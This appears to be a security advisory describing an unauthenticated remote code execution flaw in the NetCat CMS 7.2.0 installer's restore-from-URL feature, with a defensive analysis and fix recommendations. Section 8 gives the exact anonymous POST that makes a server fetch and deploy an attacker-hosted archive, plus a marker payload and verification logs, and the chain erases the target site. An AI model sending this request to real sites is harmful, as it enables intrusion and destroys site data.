# NetCat CMS / NetCat E-Commerce 7.2.0 (build 26228) - Unauthenticated Remote Code Execution Through the Installer's Restore-From-URL Archive Handling

Advisory: https://0day-rubbish.com/blog/installer-remote-archive-rce
Repository: https://github.com/Exploit-Garbage/0day-Rubbish
Contact: disclosure@0day-rubbish.com

## 1. Overview

### Overview of the finding

NetCat CMS, also distributed under the name NetCat E-Commerce, ships its installation wizard as a directory of
PHP scripts under the web root - `install/` - whose entry point is a single large dispatcher,
`install/index.php`. In the analyzed distribution that file is 4,149 lines long and has md5
`e7331402fa104de8a03efd7d933790ca`. The dispatcher is organised as a switch over an integer `action`
parameter, with the individual arms implementing the steps of an interactive installation: language choice,
licence acceptance, database configuration, administrator creation, sample-data selection, and - the arm that
matters here - restoration of an existing site from a backup archive.

That restore feature is implemented at the arm the research record calls `case 42`, beginning at
`install/index.php:769`. It is entered not only through the wizard's own navigation but directly, by a `goto`
at `install/index.php:411-416`, whenever the incoming request carries a `backup_address` parameter. The arm
accepts a URL from that parameter, fetches it over the network, unpacks the result as a gzipped tar archive,
and then moves each top-level entry of the unpacked tree into the installation directory - the document root -
under its original name.

Three properties combine into the finding. First, the arm has no authentication of any kind: no session, no
token, no credential, no licence, and no requirement that the product be installed. Second, the archive it
fetches is entirely attacker-supplied, and nothing verifies its origin, its signature, or the names of the
entries it contains. Third, the product's own web-root configuration does not disable PHP execution, so a
`.php` file placed in the document root by that copy step runs on the next request. The result is
unauthenticated remote code execution from a single HTTP POST, preceded necessarily by destruction of the
existing site.

### Overview of the product and its installer

The distribution analyzed is `netcat-7.2.0.26228.tar.gz`. Its own metadata file `install/sql/version.sql`
records `Patch '720'`, `VersionNumber='7.2.0'` and build 26228, which places the analyzed code on the current
release line rather than on a historical branch. The installer is not a self-deleting bootstrap: the flag
`$standalone_script` is false for a full distribution because the `sql` directory sits beside the script, and
the removal code that would delete the installer lives in the arm after the restore arm, at
`install/index.php:1104-1108`, without being conditioned on that flag. A normal installation therefore leaves
the directory in place, and the product merely prints an administrative instruction to delete it, at
`install/index.php:1110-1112`. That is why the installer remains reachable after installation, a point
section 3 returns to.

Two constants shape the data flow. `NETCAT_FOLDER` is defined at `install/index.php:35` as
`($standalone_script ? __DIR__ : dirname(__DIR__)) . '/'`, so for the full distribution it resolves to the
document root. `INSTALL_FILES_FOLDER` is defined at `install/index.php:36` as `NETCAT_FOLDER . "install/"`, so
the staging directory for the downloaded archive lives inside the installer directory.

### Overview of what the verification establishes, and what it does not

The dynamic work was end-to-end over HTTP. A copy of the vendor distribution was served by Apache 2.4 with
mod_php 7.4 in an isolated sandbox container, and the exploit was driven against it as a client would drive it,
with the victim fetching the payload from a fixture HTTP server that recorded the inbound requests. The marker
that landed and executed reported the identity the web server runs as in that container: `uid=33`,
`user=www-data`. The whole chain - request, fetch, unpack, copy, execution - is therefore observed rather than
argued.

The boundary needs stating plainly, because it is where an advisory of this kind is easiest to overstate. No
physical appliance, no virtual appliance image and no QEMU-emulated device was involved. No sink-level
replication was needed either: the product's own code performed the work. What was not measured is the
identity the same code would run as on a hardened production deployment, or on an appliance distribution. The
observed identity is the container's web-server account, which is the ordinary deployment identity for this
product; no root, no host-level access and no privilege escalation beyond the web-server account was observed
at any point in the verification, and none is claimed. Section 9 keeps the measured items and the unmeasured
items in separate lists.

### Overview of the public record

A check of the public record against this product and this mechanism found no prior entry describing an
unauthenticated installer path that lands attacker-supplied code in the document root of this release line. The
recorded sweeps covered the national vulnerability database entries mapped to the vendor's content-management
product, the exploit archive, and a keyword search across the vendor's product names. The database entries that
exist for this product are all bounded above by an earlier major version and concern unrelated mechanisms
(cross-site scripting and user enumeration), and the exploit-archive entries for the content-management product
stop at an older generation and contain no remote-code-execution entry. One historical entry concerns directory
traversal in a much older release; it is a different mechanism, since the defect documented here needs no
traversal at all - the `rename()` at `install/index.php:911` is the intended behaviour of the restore feature,
and the defect is the absence of any filter on what it moves and the absence of execution control where it
moves it. The vendor's own site was reachable during the check, but its advisories and release notes were not
enumerated entry by entry, so that leg of the check is recorded as unresolved rather than as clean.

No identifier has been assigned to this finding.

## 2. Vulnerability Summary

### Vulnerability Summary table

| Field | Value |
|---|---|
| Product | NetCat CMS / NetCat E-Commerce |
| Version | 7.2.0, build 26228 (`netcat-7.2.0.26228.tar.gz`) |
| Component | `install/index.php`, switch arm `case 42` at line 769, plus the fall-through arm at lines 935-1128 |
| Entry point | `POST /install/index.php` with `action=42`, `delfiles=1`, `demodistr=1`, `backup_address=<url>` |
| Authentication | none - no cookie, no credential, no token, no licence, no installed state |
| Primary sink | `rename($cur_dir . '/' . $file, NETCAT_FOLDER . $file)` at `install/index.php:911` |
| Execution condition | document-root `.htaccess` without `php_flag engine off` |
| Landing identity observed | `uid=33 user=www-data` inside the verification container |
| Side effect | the existing site is erased on the same request |
| Identifier | none assigned |

### Vulnerability Summary mechanics

The chain has four mechanical steps, each of which is individually unremarkable and only dangerous in
composition. The request reaches the restore arm without passing a gate. The arm erases the existing
installation because the `delfiles` branch at `install/index.php:811-823` is executed before the download and the
gate at `install/index.php:826-837` does not allow the flow to continue to the download without it. The arm then
downloads the archive named by `backup_address` at `install/index.php:868` and unpacks it at
`install/index.php:883-884` into a staging directory inside `install/`. Finally the copy step at
`install/index.php:908-912` walks the unpacked tree, drops only the `.` and `..` entries that `scandir()`
produces, and renames everything else into the document root.

The copy step is the primary sink. It performs no `basename()`, no extension check, no path normalisation and no
allowlist comparison. Whatever names the archive carries are the names that land. Because the document root is
served with PHP enabled and its `.htaccess` does not turn execution off, a name ending in `.php` is executed the
first time it is requested. The write primitive and the execution condition are separate defects, and the
advisory counts them separately: CWE-434 for the unrestricted upload of a dangerous file type, CWE-494 for the
download of code without an integrity check, and CWE-306 for the missing authentication on the function that
does both.

### Vulnerability Summary preconditions

Six conditions bound the claim, and all six are stated wherever this finding is summarised. The victim host must
be able to open outbound HTTP(S) connections to the attacker's server; this is the same capability the restore
feature exists to use, but a deployment that blocks egress does not expose the chain. The document root must be
writable by the web-server account, which the product's own installation flow already requires and which the
distribution's extracted ownership reflects. The payload archive must contain at least two top-level entries,
for the reason given in section 7. Exploitation necessarily destroys the existing site first, because the
`delfiles` branch is on the only path that reaches the download. The host must provide either a system `tar`
binary or PHP's `PharData`, since the extraction step chooses between them. And a successful exploitation is
one-shot per host, because the successful path falls through into the arm that deletes the entire installer
directory.

## 3. Authentication Boundary

### Authentication Boundary - what the gate is

There is no gate. That is a measured statement, not a reading of intent. The restore arm spans
`install/index.php:769-934`, and a search of that span for the six pattern families the product uses elsewhere
for access control - `session`, `$_SESSION`, `auth`, `token`, `permission` and `nc_auth` - returns zero hits. The
same search over the rest of the file returns 84 hits, which is the positive control that makes the empty
result meaningful: the patterns do match this codebase, just not this arm.

What the arm does check is different in kind. At `install/index.php:775` it calls
`nc_installer_check_perm(NETCAT_FOLDER)`, which is a filesystem writability test on the document root, not an
identity test. At `install/index.php:792` it calls `nc_installer_check_domain()` on the supplied URL, which is a
reachability test on the attacker's own server. Neither function asks who is calling. The direct-entry `goto`
at `install/index.php:411-416` makes the point structurally: the only condition for entering the arm ahead of
the wizard's normal sequence is the presence of the `backup_address` parameter in the request.

### Authentication Boundary - what the chain does not require

The verification request carried no cookie, no session identifier, no credential, no CSRF token and no licence
key, and it was issued against a pristine, uninstalled instance that had never completed an installation and
therefore had no administrator account to borrow, no database configuration to reuse and no site state to
preserve. The product was not installed, and the chain still worked. Whatever else the installer's checks are
for, they are not for establishing who may invoke the restore feature.

### Authentication Boundary - why that does not soften the impact

It is tempting to read "it is only the installer" as a mitigation. It is not, for three reasons recorded here.
The installer directory is inside the web root and is reachable over the same HTTP surface as the site itself.
The product does not remove it after a successful installation; the deletion code exists only in a later arm,
and the normal installation path prints an instruction to the administrator instead. And the code that runs
lands in the document root, not in the installer's staging directory, so its execution does not depend on the
installer continuing to exist after the request - only on the document root continuing to be served, which is
the definition of the deployment.

### Authentication Boundary - the completed-installation question

Because the "it is only the installer" reading is the natural objection, it was tested directly rather than
argued. A copy of a completed installation was taken and served in its own container, and the same anonymous
POST was issued against it. The copy's installed state is attested by three independent facts: its
`vars.inc.php` has md5 `ac1cf514a00d5a7c10d717c9198b42df` against the distribution value
`ecf8099161399a559b14502185c6fd21`; its `netcat/` tree holds 5,931 files; and its `install/` directory still
holds 164 files, which is itself evidence that the deletion arm had never run. The request succeeded: HTTP 200,
the marker file landed in the document root, and it executed reporting `uid=33 user=www-data`. The installer
was neither absent nor protected on an installed instance. One caveat is recorded with the result: the copy was
an installed filesystem without a live database connection, which is irrelevant to this chain because the
attack path never touches the database - the same failure and the same success were reproduced on an instance
that had never been installed at all.

## 4. Attack Surface

### Attack Surface - the installer dispatcher

The installer is one script with a switch over `action`, and the arms differ enormously in what they do. Most
arms render a wizard page and write configuration; the restore arm is the one that fetches a remote archive and
deploys its entries, and the arm that follows it performs cleanup. The interesting property for an auditor is
that the dispatch is reachable without traversing the wizard: the `goto` at `install/index.php:411-416` jumps
straight to the restore arm whenever `backup_address` is present, so the state machine that constrains an
ordinary installation does not constrain an attacker.

The entry point is additionally tolerant about how parameters arrive. `nc_installer_post_get()` accepts both
POST and GET, with GET taking priority, so the same arm can be driven from a query string. The record notes that
no CSRF token is checked between actions, which means a third-party page could in principle cause an
installation-form request through an image tag; the side effects of that are a separate matter from this
finding, but the absence of a token is the same absence that lets the restore arm be driven anonymously.

### Attack Surface - why the surface narrowed here

Three observations narrowed the audit to this arm. It is the only place in the installer where a remote,
attacker-chosen file is fetched and then moved into the document root. It is the only place where the file's
name is used verbatim as a path component in the web root. And it is the only place where the product's own
shipped web-server configuration determines whether the result executes. Each of those is a necessary element
of the chain, and the arm is where all three meet.

### Attack Surface - components that narrowed out

Two nearby candidates were examined and are not part of this chain. The `exec("tar -zxf $archive_name -C
$dst_path 2>&1", $output, $err_code)` call at `install/index.php:3883` interpolates two server-side constants -
the staging directory built from `INSTALL_FILES_FOLDER` and the fixed archive name `netcat_backup.tgz` - so it is
not a command-injection sink and is recorded here only as a hardening item. The domain check at
`install/index.php:792` is a genuine anonymous SSRF surface, because `backup_address` can point at internal
addresses with no allowlist, and it is recorded as an attribute of the same gate; but the URL schemes that would
turn it into an arbitrary local file read (`file://`, `data://`, `gopher://`) are refused by that same check, so
this advisory does not claim a local file read.

## 5. Sink Identification

### Sink Identification - the copy primitive

The primary sink is four lines long and contains no filtering of any kind.

```php
array_splice($files, 0, 2);
foreach ($files as $file) {
    rename($cur_dir . '/' . $file, NETCAT_FOLDER . $file);
}
@unlink(NETCAT_FOLDER . 'restore.php'); nc_installer_clear_dir($root_archive_dir);
```

`$files` comes from `scandir($cur_dir)` at `install/index.php:893`, where `$cur_dir` is the unpacked archive
directory. `array_splice($files, 0, 2)` removes the `.` and `..` entries that `scandir()` always returns - the
only two entries the product ever discards. Everything else is renamed into `NETCAT_FOLDER`, which is the
document root. There is no `basename()`, so a name containing a path separator is not reduced to its final
component; there is no extension comparison, so `.php`, `.phtml` and `.phar` are treated exactly like `.txt`;
there is no signature, checksum or origin check, so an archive fetched from anywhere is treated as a vendor
backup. The final line deletes `restore.php` and clears the staging directory, which is tidy behaviour on a
normal restore and irrelevant to an attacker, who does not need the staging directory to survive.

### Sink Identification - the extraction sink

The extraction is a capability prerequisite rather than the defect. At `install/index.php:883` the installer
calls `nc_installer_tgz_check_exec()`, defined at `install/index.php:3845-3864`, which runs
`@exec('tar --version', $output, $err_code)` and defines `SYSTEM_TAR` from the exit code. At
`install/index.php:884` it calls `nc_installer_tgz_extract()`, defined at `install/index.php:3866-3880`, which
dispatches on that constant: with a system `tar` it runs `exec("tar -zxf $archive_name -C $dst_path 2>&1",
$output, $err_code)`; without one it falls back to `nc_installer_tgz_extract_with_phar()`, selected through
`nc_installer_archive_format()` at `install/index.php:3706-3714`. Both branches produce the same thing for the
attacker: the archive's entries, with their original names, in a directory the next step walks. The choice
between them is the reason the finding needs either `tar` or `PharData` on the host, and nothing more.

### Sink Identification - the execution root cause

The document root's `.htaccess` is 42 lines, 1,295 bytes, md5 `6841b80d4a859d668c48a1d2f2c9d17e`. It contains
`DirectoryIndex index.php`, `AddDefaultCharset utf-8`, `ErrorDocument 404 /netcat/require/e404.php`,
`Options -Indexes` and `Options +FollowSymLinks`, and it contains three conditional blocks:
`<IfModule mod_php7.c>` at lines 13-20 setting `magic_quotes_gpc off` and `display_errors off`,
`<IfModule mod_php.c>` at lines 22-29 setting the same two flags, and `<IfModule mod_rewrite.c>` at lines 31-42
whose line 39 rewrites requests to `/netcat/require/e404.php` and whose lines 40-41 push `If-Modified-Since` and
`If-None-Match` into the environment. Nowhere in those 42 lines is there a `php_flag engine off`; the count of
`engine off` occurrences in the file is 0.

The comparison that makes this an omission rather than a decision is in the next directory. `netcat_files/`, the
product's upload directory, ships an `.htaccess` that disables PHP execution in three separate conditional
blocks, for `mod_php4.c`, `mod_php5.c` and `mod_php7.c` - three occurrences of `engine off` in that file. The
vendor wrote the control, applied it to the directory where users upload files, and did not apply it to the
document root where the installer writes. The web-root file goes further than a careless omission would suggest:
it contains a `mod_php.c` block, the generic module name used by newer PHP server APIs, which means the vendor
was aware that the guarded configuration needed to cover more than one PHP generation - and still wrote no
execution-off directive in either PHP block.

### Sink Identification - what is not a sink

The `exec()` at `install/index.php:3883` is not a command-injection sink, as noted above; its two interpolated
variables are built from constants. The URL check is not a file-read primitive. The `delfiles` branch is a
destructive primitive but not a code-execution primitive; it is what makes the chain destructive rather than
quiet, and it is recorded as such.

## 6. Source Identification

### Source Identification - the request parameters

| Parameter | Read by | Role in this chain |
|---|---|---|
| `backup_address` | `nc_installer_post_get()` | the URL the victim fetches; the trigger for the direct `goto` at lines 411-416 |
| `delfiles` | `nc_installer_post_get()` | `1` enables the erase branch at lines 811-823 and satisfies the gate at lines 826-837 |
| `action` | request dispatcher | `42` selects the restore arm |
| `demodistr` | `nc_installer_post_get()` | selects the installation variant in the wizard; carried in the verified request |
| `regnum`, `code` | `nc_installer_post_get()` | licence fields, cleared only on the failure branch at lines 802-805; not needed here |
| archive content | attacker's HTTP server | entry names and entry bodies, entirely attacker-controlled |

The values that matter are `backup_address`, `delfiles` and the archive itself. The URL is fully
attacker-controlled and is not constrained by any allowlist. The archive is fully attacker-controlled and is
not constrained by any name policy. `delfiles` is a boolean the attacker simply sets.

### Source Identification - the URL gate

`nc_installer_check_domain()` is defined at `install/index.php:2853`. It performs a HEAD request through libcurl
with `CURLOPT_NOBODY` set at `install/index.php:2858`, and the record shows its TLS verification is disabled
through `CURLOPT_SSL_VERIFYPEER=false`. The gate therefore does not restrict where the request goes; it only
requires that something answers. It admits plain `http://` URLs, admits private and internal addresses, and
admits the attacker's own host. This is why the verification's fixture server saw the product's own outbound
requests rather than a client fetch, and it is also why the same parameter constitutes an anonymous SSRF
surface. What it does exclude is the set of schemes that would make the fetch read from the local filesystem or
from other protocols, so the chain cannot be re-pointed at a local file.

### Source Identification - the archive shape

The attacker controls both the names and the contents of the archive's entries, and there is no constraint on
either. The one shape requirement is not a defence but an artefact of the traversal loop described in section 7:
the archive must present at least two top-level entries, or the loop that looks for a single wrapper directory
will stall. In the verified payload the two top-level entries were the marker script and a small placeholder text
member.

## 7. Data Flow

### Data Flow - end to end

The flow, in the order the product executes it, is this.

1. A `POST /install/index.php` arrives with `backup_address` set. At `install/index.php:411-416`, the
   `goto` jumps to the restore arm at line 769, bypassing the wizard sequence.
2. At `install/index.php:775`, `nc_installer_check_perm(NETCAT_FOLDER)` verifies that the document root is
   writable. On a deployment where it is not, the arm breaks here and nothing else happens.
3. At `install/index.php:792`, `nc_installer_check_domain($backup_address)` performs the HEAD probe described
   above. A URL that answers is accepted; a URL that does not is rejected.
4. If `delfiles` is set, the branch at `install/index.php:811-823` iterates over the existing installation and
   removes it. The name list comes from `install/index.php:1204-1218` and covers `install`, `netcat`,
   `netcat_cache`, `netcat_dump`, `netcat_files`, `netcat_template`, `netcat_trash`, `.htaccess`, `favicon.ico`,
   `index.php` and `vars.inc.php`.
5. The gate at `install/index.php:826-837` decides whether to continue. Without `delfiles` it renders the
   existing-files form and breaks, so the download is not reached.
6. At `install/index.php:868`, `nc_installer_download($backup_address, $backup_dir . '/netcat_backup.tgz')`
   fetches the archive. The downloader at `install/index.php:3820-3838` opens the URL with `fopen($url, 'rb')`
   and copies it in 4,096-byte reads.
7. At `install/index.php:883-884`, the archive is extracted into the staging directory, by `tar` or by
   `PharData` as described above.
8. At `install/index.php:892-906`, the installer walks the extracted tree looking for a single wrapper
   directory; at `install/index.php:908-912` it splices off `.` and `..` and renames every remaining top-level
   entry into the document root.
9. The next HTTP request for the landed `.php` file is served by the web server, which executes it because the
   document-root configuration does not disable PHP.

### Data Flow - the descent loop

The walk between extraction and the copy step is the reason a naive payload fails, and it deserves to be quoted
because it constrains the exploit rather than the victim.

```php
$cur_dir = $backup_dir;  $files = scandir($cur_dir);
if (is_array($files)) { $root_archive_dir = $backup_dir . '/' . $files[2];
  while (count($files) == 3) { if (is_dir($cur_dir . "/" . $files[2])) { $cur_dir .= "/" . $files[2]; $files = scandir($cur_dir); if (!is_array($files)) break; } }
```

With a single top-level entry the directory listing contains exactly three entries - `.`, `..`, and the one
name - so `count($files) == 3` is true and the loop is entered. If that entry is a directory the loop descends
into it and the process repeats; if it is a file, no descent happens and the condition is unchanged, so the loop
makes no progress. The first attempt at verification failed exactly this way: a one-entry archive left the
payload unlanded and the erase step apparently ineffective. The operative rule is therefore that the payload
archive must present at least two top-level entries, or a single top-level directory containing at least two
entries. This is an exploitability constraint, not a defence: the vendor's own backups are multi-file archives
and never take the stalled path, which is why the branch has survived.

### Data Flow - properties worth naming

Three properties of the flow matter beyond the mechanics. The copy is name-preserving, so the attacker chooses
the URL path at which the code will be reachable - there is no randomisation. The download is performed by the
server, not by the client, which is why the victim must be able to reach the attacker and why the attacker's
server sees the product's own user-agent-less requests. And the destructive step precedes the download, so a
failed exploitation still leaves the site erased if the earlier steps succeeded; the request is not atomic in
the victim's favour.

## 8. Exploit Construction

### Exploit Construction - request shape

The whole exploit is a single form-encoded POST to the installer's entry point.

```
POST /install/index.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

action=42&delfiles=1&demodistr=1&backup_address=http://172.24.0.1:18098/payload.tgz
```

No cookie, no authentication header, no token. `action=42` selects the restore arm, `delfiles=1` satisfies the
gate that stands between the arm and the download, `demodistr=1` selects the installation variant the wizard
expects, and `backup_address` points at the attacker's fixture server, which must be reachable from the victim.

### Exploit Construction - payload engineering

The archive is built in memory as a gzipped tar with exactly two top-level entries: the marker script and a
small placeholder text member, present only to satisfy the descent loop. The marker script reports the identity
the product is running as, taken from the product side rather than from the shell that launched it, so that the
observation cannot be contaminated by the operator's own privileges.

```
<?php echo "NC_UNAUTH_RCE_04eed2532453 uid=".posix_getuid().
" user=".posix_getpwuid(posix_getuid())["name"]." host=".gethostname()." file=".__FILE__; ?>
```

The file name carries a random nonce, `nc_poc_04eed2532453.php`, and the nonce is repeated inside the marker
string. The random name serves two purposes: it lets the pre-attack control assert that the file did not exist
beforehand, and it avoids the case where an existing file of the same name is masked by an opcode cache that
does not revalidate timestamps. The archive produced for the recorded run was 286 bytes with md5
`fb36a876bed735c5d75eb671eeaa4f59`; the run against the completed installation produced a 286-byte archive with
md5 `671880a7af1cf8d880af7172cdd98264`.

The fixture HTTP server is part of the exploit, not an incidental detail: the victim must fetch the archive from
somewhere, and the fixture is what proves the fetch was the victim's own. It binds only the interface the
operator names, and the script refuses to bind every interface, because the forensic host used for verification
is internet-facing.

### Exploit Construction - what the PoC deliberately does not do

The accompanying script plants one marker file and reads it back. It does not open a shell, does not exfiltrate
anything, does not touch the database, and does not carry any credential. Its target defaults to a documentation
address, so an unconfigured run sends nothing anywhere. Because the erase step is a required part of the chain,
the script does not send `delfiles` unless the operator explicitly acknowledges that the site will be destroyed;
without that acknowledgement the request stops at the gate at `install/index.php:826-837`, which is exactly the
non-destructive behaviour observed in the second control. That design keeps the tool's default action harmless
while leaving the verified chain reproducible when an operator asks for it on a system they own.

## 9. Dynamic Verification

### Dynamic Verification - environment and method, stated exactly

| Element | Value |
|---|---|
| Method | end-to-end HTTP against a real copy of the vendor distribution, driven by the working exploit |
| Target | the distribution served by Apache 2.4 with mod_php 7.4 in an isolated sandbox container, document root `/var/www/html` |
| Target state | pristine, never installed; no database, no licence, no administrator account |
| Network | container bridge, victim's port published on loopback only; fixture HTTP server bound to the bridge gateway `172.24.0.1` |
| Payload | archive with two top-level entries, 286 bytes, md5 `fb36a876bed735c5d75eb671eeaa4f59` |
| Observation | marker file returned by the victim's own web server, read back over HTTP |
| Identity reported | by the product's PHP runtime: `uid=33`, `user=www-data` |
| Not performed | no physical appliance, no virtual appliance image, no QEMU emulation, no sink-level replication |

The method is stated this way because the usual formulation of these boundaries does not fit. This was not a
sink-level replication of a disassembled routine, and it was not an emulated appliance: the vendor's own PHP
code ran under a real web server and the exploit crossed the network twice - once from the attacker to the
victim, once from the victim back to the attacker's fixture.

### Dynamic Verification - controls and results

Three controls and one attack were run in sequence, and the whole sequence is one uninterrupted transcript from
a single execution.

```
[*] payload   : nc_poc_04eed2532453.php (286 B archive, md5 fb36a876bed735c5d75eb671eeaa4f59, top-level entries = 2)
[*] control 1 GET /nc_poc_04eed2532453.php (before attack) -> HTTP 500 size=0
[*] control 2 POST action=42 WITHOUT backup_address -> HTTP 200 size=39464 (expected: a form, no destruction)
[*] control 3 POST with dead backup_address -> HTTP 200 size=39491  (rejection text present: True)
[*] ATTACK    POST /install/index.php
[*]           -> HTTP 200 size=42021 in 0.154s
[*] fixture   : requests received from the victim: ['HEAD /payload.tgz ua=None', 'GET /payload.tgz ua=None']
[*] verify    GET /nc_poc_04eed2532453.php -> HTTP 200 size=108
[*]           body: NC_UNAUTH_RCE_04eed2532453 uid=33 user=www-data host=95ebcd3cdc6f file=/var/www/html/nc_poc_04eed2532453.php
```

The first control establishes that the file did not exist before the attack: a request for the marker path
returned HTTP 500 with an empty body on the uninstalled instance, which is the product's rewrite sending the
request to an `index.php` that does not exist yet. The second control establishes that the wizard request without
`backup_address` is harmless - it returns the variant-selection form, 39,464 bytes, and changes nothing; the
record corrected the attribution of this behaviour, which is the break at `install/index.php:807` for a missing
`backup_address`, not the later gate. The third control establishes that the URL gate is doing something: a dead
URL produces a response of 39,491 bytes, 27 bytes longer than the no-URL form and byte-wise different from it.
That difference is the criterion the record settled on after two corrections; a string that looks like a
rejection message was found to be present in the static wizard markup as well, so the criterion is differential
rather than lexical.

The attack itself returned HTTP 200 with a 42,021-byte body in 0.154 seconds, and the body carried the
product's own two Russian-language progress labels for the unpack and move stages, which is the product saying
that it performed both steps. The fixture log is the load-bearing evidence that the fetch was the victim's: two
inbound requests, `HEAD /payload.tgz` then `GET /payload.tgz`, both with no user-agent string. A curl client
would have identified itself; PHP's libcurl does not.

Two follow-up measurements belong to the same run but were taken from the operator's shell rather than from the
script, and the record separates them for that reason. The document root after the attack contained the landed
marker script, the placeholder text member from the archive, and a `netcat_dump` directory; the directory is not
a leftover from the erase step but a reconstruction performed by the following arm at
`install/index.php:1055`, which is only reached because the restore arm has no `break` on its success path. The
erase counts were `netcat` 5,925 files to 0, `netcat_template` 1,510 to 0, `netcat_files` 14 to 0 and `install`
164 to 0.

### Dynamic Verification - the completed-installation run

The second run repeated the whole sequence against the copy of a completed installation described in section 3.
Its control 1 returned HTTP 404 rather than 500, which is the expected difference: an installed instance has a
real `index.php`, so a request for an absent file gets a genuine not-found rather than a rewrite into a missing
one. Both values establish the same thing, that the marker file did not exist. The attack returned HTTP 200 with
a 42,021-byte body in 0.214 seconds, the fixture recorded the same two user-agent-less requests, and the
follow-up GET returned HTTP 200 with the same 108-byte body shape, this time reading
`NC_UNAUTH_RCE_1bdb30fd1c27 uid=33 user=www-data host=1736927a8feb
file=/var/www/html/nc_poc_1bdb30fd1c27.php`. After the run, `netcat` and `install` both counted 0 files: the
same erase, and this time the entire `install/` directory was gone, which is the measured confirmation that the
success path falls through into the arm that deletes the installer.

### Dynamic Verification - negatives, stated

- PHP 8 and php-fpm were not exercised. The verification ran mod_php 7.4 only. Because the execution-off
  blocks in the product's own `.htaccess` files are written only for `mod_php4.c`, `mod_php5.c`, `mod_php7.c` and
  the generic `mod_php.c` block carries no execution-off directive either, a PHP 8 deployment is expected to
  widen the exposure rather than narrow it, but that is an inference and not a measurement.
- Only `.php` was detonated. `.phtml`, `.pht` and `.php7` were not separately verified. Since the copy step at
  `install/index.php:911` performs no extension filter at all, those are expected to behave the same way, but the
  record does not claim it as measured.
- No parameter combination that lands code without erasing the site was found. The gate at
  `install/index.php:826-837` requires `delfiles` before the download is reached, and whether some other arm can
  reach the same copy step was not enumerated.
- No live appliance, appliance firmware or emulated device was driven; no claim is made about identities on
  deployments other than the container that was measured.
- Vendor advisories and release notes were not enumerated entry by entry, so the public-record check on that leg
  is recorded as unresolved rather than as clean.

## 10. Reachability and Security Impact

### Reachability - network position

The installer is served from the web root over HTTP, on the same listener and the same virtual host as the site
itself. Nothing in the analyzed code limits it to a management interface, a maintenance window or a local
address. The only reachability question that remains is whether the deployment exposes the installer, and on
the analyzed distribution it does: the directory ships in the web root, the installation flow does not delete
it, and it answers anonymous requests both before and after an installation completes. An attacker needs a
network path to the site - the ordinary internet-facing position of a content-management deployment - and
nothing more. No account on the product is needed, which is what section 3 measured.

### Reachability - impact in concrete terms

The immediate impact is code execution as the account the web server runs as; in the verification that was
`uid=33`, `www-data`. Within that authority an attacker reads and writes the files the site serves, which for a
storefront means the pages, templates and uploaded assets its customers see. The product's own configuration
material is inside that same authority: the document root holds `vars.inc.php`, the configuration file the
installer itself manages and names in its own file list at `install/index.php:1204-1218`. The record does not
enumerate the contents of that file, so this advisory claims only what the authority implies - the web-server
account can read what sits in the web root - and does not claim a specific secret, a database credential or any
database interaction. No database interaction was performed during verification, and none is claimed.

The second impact is destruction, and it is intrinsic rather than incidental. The `delfiles` branch is a
required step on the only path to the download, and it removed 5,925 files under `netcat/`, 1,510 under
`netcat_template/`, 14 under `netcat_files/` and 164 under `install/` in the measured run. An attacker who
reaches the download has already erased the site, which means the finding is a destructive one even when the
landed payload is a harmless marker.

### Reachability - the one-shot limit

The successful path has no `break`, so execution continues into the following arm, whose
`install/index.php:1104-1108` clears `INSTALL_FILES_FOLDER` and unlinks the running script. The measured
consequence is that after one successful exploitation the entire `install/` directory is gone and a second
attempt on the same host fails until an administrator redeploys the distribution. This is a limit on
persistence, not on impact: the first request is the one that matters, and by the time the installer removes
itself the attacker's file is already in the document root and already executing. It does mean that the finding
should not be described as a quiet foothold; it is a single destructive strike whose payoff is a planted
web-shell that outlives the installer.

## 11. Fix Recommendations

### Fix Recommendations - layered

| Layer | Recommendation | Why, in terms of the recorded facts |
|---|---|---|
| Entry | Deny external access to `install/` at the web server, and delete the directory after installation; the current deletion runs only when execution reaches the later arm, and the restore arm is reachable anonymously before that | `case 42` has no authentication over lines 769-934, and the distribution ships `install/` without its own access control file |
| Source | Restrict `backup_address` to an allowlist of vendor or operator hosts over HTTPS, verify a signature or checksum of the fetched archive, and remove `CURLOPT_SSL_VERIFYPEER=false` | the URL is fully attacker-controlled and the probe verifies nothing, which also makes the parameter an anonymous SSRF surface |
| Copy | Apply `basename()` and an allowlist of expected entry names before the `rename()` at `install/index.php:911`, and refuse `*.php*`, `*.phtml*`, `*.pht*`, `*.phar*` | the copy step discards only `.` and `..` and performs no other filtering |
| Execution | Add `<FilesMatch "\.(php[0-9]?|phtml?|phar)$"> php_flag engine off </FilesMatch>` to the web-root `.htaccess`, and extend the protection that `netcat_files/.htaccess` already has to the web root, `netcat/`, `netcat_template/` and `netcat/tmp/` | the web-root file has two PHP blocks and neither disables execution, while the upload directory's file disables it three times |
| Destructive branch | Require an authenticated administrator session and an explicit confirmation before the `delfiles` branch runs, and take a backup before erasing | an anonymous request can erase a site as a precursor to the download |
| Extraction | Replace `exec("tar -zxf ...")` with an in-process reader that validates each member's destination path, and make the `tar` and `PharData` branches behave identically | the extraction currently depends on host tooling and does not validate member paths |
| CSRF | Add a token to every installer action and resolve parameters from POST only, not GET-first | no token is checked, and GET precedence lets a third-party page drive the installer |

None of these layers alone is sufficient, and the last one is the cheapest: disabling PHP execution in the
document root turns the finding back into a file-write primitive that destroys a site but does not execute
attacker code. That is still serious, which is why the copy-step filter is the second cheapest fix and the one
that addresses the root cause rather than the amplifier.

## 12. CWE

### CWE - classification rationale

CWE-434, unrestricted upload of a file with a dangerous type, is the primary class. The product takes an
attacker-supplied archive, extracts it, and moves entries whose names it never inspects into a directory from
which PHP is executed. The "upload" here is not a multipart form post but a server-side fetch followed by a
rename; the class is about the absence of a type restriction on a file that becomes executable, and that is
exactly the defect at `install/index.php:911`.

CWE-494, download of code without integrity check, is the contributing class for the fetch. `backup_address`
names an arbitrary host, the domain probe at `install/index.php:792` verifies reachability and nothing else, TLS
verification is disabled, and no signature or checksum is compared before the archive is unpacked and deployed.
The product is treating a remote, unauthenticated document as a trusted vendor backup.

CWE-306, missing authentication for a critical function, is the contributing class for the entry. The restore
function erases a site and deploys files into the web root; it is a critical function by any reading, and it is
reachable with no credential at all, on an instance that has never been installed.

Two neighbouring classes are recorded as not applicable, for the avoidance of doubt. This is not CWE-22: no
traversal is needed, because the copy target is the document root by design. It is not CWE-78: the one `exec()`
call on the path interpolates server-side constants only.

---
Written by the 0day Rubbish Research Team.
